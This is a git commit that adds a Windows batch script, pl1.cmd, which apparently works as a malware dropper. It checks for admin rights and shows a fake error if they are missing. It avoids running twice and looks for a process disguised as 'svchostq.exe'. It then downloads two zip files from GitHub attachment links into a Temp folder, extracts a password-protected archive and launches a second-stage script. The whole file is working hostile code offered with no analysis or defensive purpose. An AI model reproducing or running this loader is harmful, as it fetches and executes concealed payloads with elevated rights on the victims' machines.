bd0eb3b4d37cb2dc1686c9ece7e2dcc0da236b24
ghrkkaa-sys <ghrkkaa@gmail.com>
2025-10-07 10:11:50 +0545

    pl1.cmd

---
+++ pl1.cmd
@@ -0,0 +1,26 @@
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('error code 1')"
+    exit /b
+)
+
+tasklist /fi "windowtitle eq app" | findstr /i "app" >nul
+if %errorlevel%==0 exit
+title app
+
+tasklist /fi "imagename eq svchostq.exe" | findstr /i "svchostq.exe" >nul
+if %errorlevel%==0 exit
+
+mkdir "%localappdata%\Temp\appv1"
+cd "%localappdata%\Temp\appv1"
+curl -L -o"7z.zip" "https://github.com/user-attachments/files/22734685/7z.zip"
+curl -L -o"a.zip" "https://github.com/user-attachments/files/22734686/a.zip"
+tar -xf "7z.zip"
+tar -xf "a.zip"
+start "" "7z\7za.exe" x a.7z -p"dCkJGdS*6888Bm1P" -y
+timeout /t 4
+taskkill /f /im 7za.exe
+pl2.cmd
+
+
+cmd /k
